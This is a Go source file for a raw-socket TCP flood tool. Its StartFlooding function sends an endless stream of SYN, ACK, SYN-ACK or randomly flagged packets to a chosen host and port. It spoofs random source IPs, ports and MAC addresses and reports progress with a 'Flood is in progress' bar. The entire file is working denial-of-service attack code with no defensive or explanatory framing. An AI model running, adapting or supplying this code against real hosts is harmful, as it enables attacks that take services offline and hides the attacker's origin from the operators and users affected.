package synfloodraw

import (
	"fmt"
	"math"
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/schollz/progressbar/v3"
	"golang.org/x/net/ipv4"
)

func init() {
	// initialize global pseudo random generator
	rand.Seed(time.Now().Unix())
}

// StartFlooding does the heavy lifting, starts the flood
func StartFlooding(stopChan chan bool, destinationHost string, destinationPort, payloadLength int, floodType string) error {
	var (
		ipHeader   *ipv4.Header
		packetConn net.PacketConn
		rawConn    *ipv4.RawConn
		err        error
	)

	destinationHost, err = resolveHost(destinationHost)
	if err != nil {
		return err
	}

	description := fmt.Sprintf("Flood is in progress, target=%s:%d, floodType=%s, payloadLength=%d",
		destinationHost, destinationPort, floodType, payloadLength)
	bar := progressbar.DefaultBytes(-1, description)

	payload := getRandomPayload(payloadLength)
	srcIps := getIps()
	srcPorts := getPorts()
	macAddrs := getMacAddrs()

	for {
		select {
		case <-stopChan:
			return nil
		default:
			tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], destinationPort, floodType)
			ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], destinationHost)
			if err = tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
				return err
			}

			// Serialize.  Note:  we only serialize the TCP layer, because the
			// socket we get with net.ListenPacket wraps our data in IPv4 packets
			// already.  We do still need the IP layer to compute checksums
			// correctly, though.
			ipHeaderBuf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				FixLengths:       true,
				ComputeChecksums: true,
			}

			if err = ipPacket.SerializeTo(ipHeaderBuf, opts); err != nil {
				return err
			}

			if ipHeader, err = ipv4.ParseHeader(ipHeaderBuf.Bytes()); err != nil {
				return err
			}

			ethernetLayer := buildEthernetPacket(macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))])
			tcpPayloadBuf := gopacket.NewSerializeBuffer()
			pyl := gopacket.Payload(payload)

			if err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, pyl); err != nil {
				return err
			}

			// XXX send packet
			if packetConn, err = net.ListenPacket("ip4:tcp", "0.0.0.0"); err != nil {
				return err
			}

			if rawConn, err = ipv4.NewRawConn(packetConn); err != nil {
				return err
			}

			if err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil); err != nil {
				return err
			}

			if err = bar.Add(payloadLength); err != nil {
				return err
			}
		}
	}
}

// buildIpPacket generates a layers.IPv4 and returns it with source IP address and destination IP address
func buildIpPacket(srcIpStr, dstIpStr string) *layers.IPv4 {
	return &layers.IPv4{
		SrcIP:    net.ParseIP(srcIpStr).To4(),
		DstIP:    net.ParseIP(dstIpStr).To4(),
		Version:  4,
		Protocol: layers.IPProtocolTCP,
	}
}

// buildTcpPacket generates a layers.TCP and returns it with source port and destination port
func buildTcpPacket(srcPort, dstPort int, floodType string) *layers.TCP {
	var isSyn, isAck, isFin, isRst, isPsh, isUrg, isEce, isCwr, isNs bool
	var SeqNum uint32 = 1105024978
	var Ack uint32 = 0
	var Window uint16 = 14600
	var Urgent uint16 = 0
	switch floodType {
	case TypeSyn:
		isSyn = true
	case TypeAck:
		isAck = true
	case TypeSynAck:
		isSyn = true
		isAck = true
	case TypeRandom:
		isSyn = rand.Intn(100) < 90
		isAck = rand.Intn(100) < 90
		isFin = rand.Intn(100) < 10
		isRst = rand.Intn(100) < 10
		isPsh = rand.Intn(100) < 10
		isUrg = rand.Intn(100) < 20
		isEce = rand.Intn(100) < 20
		isCwr = rand.Intn(100) < 10
		isNs = rand.Intn(100) < 5
		SeqNum = rand.Uint32()
		if isAck {
			Ack = rand.Uint32()
		}
		Window = uint16(rand.Intn(math.MaxUint16))
		if isUrg {
			Urgent = uint16(rand.Intn(math.MaxUint16))
		}
	}

	return &layers.TCP{
		SrcPort: layers.TCPPort(srcPort),
		DstPort: layers.TCPPort(dstPort),
		Window:  Window,
		Urgent:  Urgent,
		Seq:     SeqNum,
		Ack:     Ack,
		SYN:     isSyn,
		ACK:     isAck,
		FIN:     isFin,
		RST:     isRst,
		PSH:     isPsh,
		URG:     isUrg,
		ECE:     isEce,
		CWR:     isCwr,
		NS:      isNs,
	}
}

// buildEthernetPacket generates an layers.Ethernet and returns it with source MAC address and destination MAC address
func buildEthernetPacket(srcMac, dstMac []byte) *layers.Ethernet {
	return &layers.Ethernet{
		SrcMAC: net.HardwareAddr{srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]},
		DstMAC: net.HardwareAddr{dstMac[0], dstMac[1], dstMac[2], dstMac[3], dstMac[4], dstMac[5]},
	}
}
